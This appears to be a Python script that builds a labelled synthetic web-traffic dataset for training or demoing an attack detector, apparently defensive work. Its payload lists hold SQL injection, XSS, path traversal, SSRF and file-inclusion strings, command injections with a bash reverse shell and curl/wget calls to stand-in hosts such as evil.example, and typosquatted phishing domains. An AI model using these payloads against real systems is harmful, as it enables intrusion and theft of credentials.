"""
generate_dataset.py
Synthetic HTTP traffic dataset generator.

DEMO PROTOTYPE -- All data is entirely synthetic.
No real IPs, no real credentials, no real victims, no real IPDR data.

Generates ~1,100 records covering 13 attack types + Normal traffic.
Run:
    python generate_dataset.py
Output:
    data/synthetic_traffic.csv
"""

import os
import random
import string
from datetime import datetime, timedelta

import numpy as np
import pandas as pd

SEED = 42
random.seed(SEED)
np.random.seed(SEED)

# --- Output path ----------------------------------------------------------------
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "data")
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "synthetic_traffic.csv")

# --- Simulated IPs (all RFC-1918 / example ranges -- not real hosts) -------------
SRC_IPS = [f"10.0.{r}.{h}" for r in range(0, 5) for h in range(1, 16)]
DST_IPS = [f"192.168.1.{x}" for x in [10, 20, 30, 50]]

# --- Realistic user agents ------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "python-requests/2.31.0",
    "curl/8.4.0",
    "sqlmap/1.8 (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 zgrab/0.x",
    "Go-http-client/1.1",
    "Wget/1.21.4 (linux-gnu)",
]

HOSTS = [
    "demo-app.internal",
    "api.demo-app.internal",
    "admin.demo-app.internal",
    "shop.demo-app.internal",
]

BASE_TIME = datetime(2024, 6, 1, 0, 0, 0)


def _ts(offset_secs: float) -> str:
    return (BASE_TIME + timedelta(seconds=offset_secs)).isoformat()


def _rand_ip() -> str:
    return random.choice(SRC_IPS)


def _rand_ua() -> str:
    return random.choice(USER_AGENTS)


def _rand_host() -> str:
    return random.choice(HOSTS)


# --- Attack-specific URL generators ----------------------------------------------

def _normal_urls(n: int):
    paths = [
        "/", "/home", "/about", "/contact", "/products", "/services",
        "/search?q=shoes", "/search?q=laptops", "/user/profile",
        "/api/v1/items", "/api/v1/items/42", "/login", "/logout",
        "/dashboard", "/news/latest", "/docs/overview",
        "/static/app.js", "/static/style.css", "/favicon.ico",
    ]
    rows = []
    for i in range(n):
        method = random.choice(["GET"] * 7 + ["POST"] * 2 + ["PUT"])
        status = random.choice([200, 200, 200, 200, 304, 301, 404])
        rows.append({
            "method": method,
            "host": _rand_host(),
            "url": random.choice(paths),
            "user_agent": random.choice(USER_AGENTS[:5]),
            "status_code": status,
            "response_size": random.randint(200, 12000),
            "attack_type": "Normal",
        })
    return rows


def _sql_injection_urls(n: int):
    payloads = [
        "/search?id=1' OR '1'='1",
        "/user?id=1 UNION SELECT username,password FROM users--",
        "/product?cat=1; DROP TABLE products--",
        "/api/data?filter=1' AND SLEEP(5)--",
        "/login?user=admin'--&pass=x",
        "/items?id=1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
        "/page?id=1 AND BENCHMARK(1000000,MD5('test'))",
        "/search?q='; INSERT INTO logs VALUES('hacked')--",
        "/api/v1/users?sort=id,name); SELECT * FROM users--",
        "/product?id=2 UNION ALL SELECT NULL,NULL,NULL--",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": "GET",
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS[5:]),
            "status_code": random.choice([200, 500, 403]),
            "response_size": random.randint(50, 3000),
            "attack_type": "SQL Injection",
        })
    return rows


def _xss_urls(n: int):
    payloads = [
        "/search?q=<script>alert('XSS')</script>",
        "/comment?text=<img src=x onerror=alert(document.cookie)>",
        "/name?val=<svg onload=fetch('https://evil.example/steal?c='+document.cookie)>",
        "/profile?bio=javascript:void(document.write('<script>...</script>'))",
        "/page?redirect=javascript:alert(1)",
        "/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "/api/echo?msg=<ScRiPt>alert('xss')</sCrIpT>",
        "/form?input=<iframe src=javascript:alert('xss')>",
        "/user?name=<body onload=alert('xss')>",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": random.choice(["GET", "POST"]),
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS),
            "status_code": random.choice([200, 400, 403]),
            "response_size": random.randint(100, 5000),
            "attack_type": "XSS",
        })
    return rows


def _directory_traversal_urls(n: int):
    payloads = [
        "/download?file=../../etc/passwd",
        "/view?path=../../../windows/win.ini",
        "/load?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/static/../../../etc/shadow",
        "/img?src=....//....//etc/passwd",
        "/file?name=..%2F..%2F..%2Fetc%2Fpasswd",
        "/read?doc=../../boot.ini",
        "/api/files?f=../../../proc/self/environ",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": "GET",
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS[4:]),
            "status_code": random.choice([200, 403, 404]),
            "response_size": random.randint(50, 4000),
            "attack_type": "Directory Traversal",
        })
    return rows


def _command_injection_urls(n: int):
    payloads = [
        "/ping?host=127.0.0.1;cat /etc/passwd",
        "/exec?cmd=whoami",
        "/api/run?input=ls -la | wget http://evil.example/out",
        "/tool?arg=; id && curl http://c2.example/beacon",
        "/check?ip=192.168.1.1`id`",
        "/dns?name=test.com%26%26cat%20/etc/shadow",
        "/scan?target=localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "/api/v1/exec?q=test$(id)",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": random.choice(["GET", "POST"]),
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS[3:]),
            "status_code": random.choice([200, 500, 403]),
            "response_size": random.randint(50, 2000),
            "attack_type": "Command Injection",
        })
    return rows


def _ssrf_urls(n: int):
    payloads = [
        "/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/proxy?target=http://localhost:8080/admin",
        "/load?src=http://127.0.0.1:22/",
        "/api/fetch?endpoint=http://metadata.google.internal/computeMetadata/v1/",
        "/img?url=http://10.0.0.1/internal-api",
        "/webhook?callback=http://localhost:9200/_cat/nodes",
        "/redirect?to=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": "GET",
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS[3:]),
            "status_code": random.choice([200, 403, 500]),
            "response_size": random.randint(100, 3000),
            "attack_type": "SSRF",
        })
    return rows


def _lfi_rfi_urls(n: int):
    payloads = [
        "/page?include=php://filter/convert.base64-encode/resource=index.php",
        "/view?file=file:///etc/passwd",
        "/load?module=http://evil.example/shell.txt",
        "/index.php?page=../../etc/passwd",
        "/cms?template=../../../../../../../etc/passwd%00",
        "/app?page=http://evil.example/inject.php",
        "/portal?load=php://input",
        "/includes?file=../../../windows/system32/drivers/etc/hosts",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": "GET",
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS[3:]),
            "status_code": random.choice([200, 403, 500]),
            "response_size": random.randint(100, 5000),
            "attack_type": "LFI/RFI",
        })
    return rows


def _brute_force_urls(n: int, single_ip: str | None = None):
    rows = []
    ip = single_ip or _rand_ip()
    endpoints = ["/login", "/signin", "/admin/login", "/wp-login.php", "/api/auth"]
    usernames = ["admin", "root", "administrator", "user", "test", "guest"]
    for i in range(n):
        # Occasionally rotate the endpoint
        if i % 15 == 0 and not single_ip:
            ip = _rand_ip()
        url = random.choice(endpoints) + f"?username={random.choice(usernames)}&password={''.join(random.choices(string.ascii_letters, k=8))}"
        rows.append({
            "method": "POST",
            "host": _rand_host(),
            "url": url,
            "source_ip_override": ip,
            "user_agent": random.choice(USER_AGENTS[3:]),
            "status_code": random.choice([401, 401, 401, 403, 200]),
            "response_size": random.randint(50, 500),
            "attack_type": "Brute Force",
        })
    return rows


def _credential_stuffing_urls(n: int):
    rows = []
    ip = _rand_ip()
    usernames = [f"user{i}@example.com" for i in range(200)]
    for i in range(n):
        if i % 20 == 0:
            ip = _rand_ip()
        user = usernames[i % len(usernames)]
        url = f"/login?email={user}&password=P@ssw0rd{random.randint(1,99)}"
        rows.append({
            "method": "POST",
            "host": _rand_host(),
            "url": url,
            "source_ip_override": ip,
            "user_agent": random.choice(USER_AGENTS[3:]),
            "status_code": random.choice([401, 401, 200]),
            "response_size": random.randint(50, 400),
            "attack_type": "Credential Stuffing",
        })
    return rows


def _http_param_pollution_urls(n: int):
    payloads = [
        "/api/transfer?amount=100&amount=9999",
        "/user?id=1&id=2&id=3",
        "/search?q=normal&q=<script>alert(1)</script>",
        "/pay?to=legit&to=attacker",
        "/api/items?sort=id&sort=id DESC; DROP TABLE items--",
        "/checkout?price=1000&price=1",
        "/submit?token=abc&token=hacked",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": random.choice(["GET", "POST"]),
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS),
            "status_code": random.choice([200, 400, 500]),
            "response_size": random.randint(100, 2000),
            "attack_type": "HTTP Parameter Pollution",
        })
    return rows


def _xxe_urls(n: int):
    # XXE happens in POST body but we record the endpoint + reflect it in URL
    endpoints = [
        "/api/xml/parse",
        "/upload/xml",
        "/api/v1/data",
        "/soap/endpoint",
        "/api/report/generate",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": "POST",
            "host": _rand_host(),
            "url": random.choice(endpoints) + "?format=xml&entity=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
            "user_agent": random.choice(USER_AGENTS),
            "status_code": random.choice([200, 400, 500]),
            "response_size": random.randint(100, 3000),
            "attack_type": "XXE",
        })
    return rows


def _webshell_urls(n: int):
    payloads = [
        "/uploads/shell.php?cmd=id",
        "/files/c99.php?pass=admin",
        "/wp-content/uploads/backdoor.php?exec=whoami",
        "/static/assets/image.php?system=ls",
        "/api/files/test.php?shell_exec=cat /etc/passwd",
        "/images/thumb.php?passthru=ls -la",
        "/shell.php?c=system('id')",
        "/admin/file.php?passthru=uname -a",
    ]
    rows = []
    for i in range(n):
        rows.append({
            "method": random.choice(["GET", "POST"]),
            "host": _rand_host(),
            "url": random.choice(payloads),
            "user_agent": random.choice(USER_AGENTS[3:]),
            "status_code": random.choice([200, 404, 403]),
            "response_size": random.randint(50, 1500),
            "attack_type": "Web Shell Upload",
        })
    return rows


def _typosquatting_urls(n: int):
    typo_hosts = [
        "paypa1.com", "paypai.com", "paypa1-secure.com",
        "g00gle.com", "gooogle.com", "google-login.demo.com",
        "faceb00k.com", "faceboo.com",
        "arnazon.com", "amazom.com", "amazon-orders.demo.com",
        "mlcrosoft.com", "micros0ft.com",
    ]
    paths = ["/login", "/signin", "/checkout", "/verify", "/confirm", "/secure"]
    rows = []
    for i in range(n):
        rows.append({
            "method": "GET",
            "host": random.choice(typo_hosts),
            "url": random.choice(paths) + f"?redirect=https://evil.example&user={random.randint(1000,9999)}",
            "user_agent": random.choice(USER_AGENTS[:4]),
            "status_code": random.choice([200, 301, 302]),
            "response_size": random.randint(200, 3000),
            "attack_type": "Typosquatting",
        })
    return rows


# --- Assemble dataset ----------------------------------------------------------

def generate_dataset() -> pd.DataFrame:
    all_rows = []
    offset = 0.0

    spec = [
        (_normal_urls,              200),
        (_sql_injection_urls,       100),
        (_xss_urls,                 100),
        (_brute_force_urls,          80),
        (_credential_stuffing_urls,  80),
        (_directory_traversal_urls,  80),
        (_command_injection_urls,    80),
        (_lfi_rfi_urls,              70),
        (_ssrf_urls,                 70),
        (_http_param_pollution_urls, 70),
        (_xxe_urls,                  60),
        (_webshell_urls,             60),
        (_typosquatting_urls,        60),
    ]

    for fn, count in spec:
        rows = fn(count)
        for row in rows:
            row["timestamp"] = _ts(offset)
            row["source_ip"] = row.pop("source_ip_override", _rand_ip())
            row["destination_ip"] = random.choice(DST_IPS)
            row.setdefault("user_agent", _rand_ua())
            offset += random.uniform(0.5, 60)
        all_rows.extend(rows)

    df = pd.DataFrame(all_rows)
    df = df.sample(frac=1, random_state=SEED).reset_index(drop=True)

    # Enforce column order
    cols = [
        "timestamp", "source_ip", "destination_ip",
        "method", "host", "url", "user_agent",
        "status_code", "response_size", "attack_type",
    ]
    df = df[cols]

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    df.to_csv(OUTPUT_FILE, index=False)
    print(f"[generate_dataset] Saved {len(df)} records -> {OUTPUT_FILE}")
    print(df["attack_type"].value_counts().to_string())
    return df


if __name__ == "__main__":
    generate_dataset()
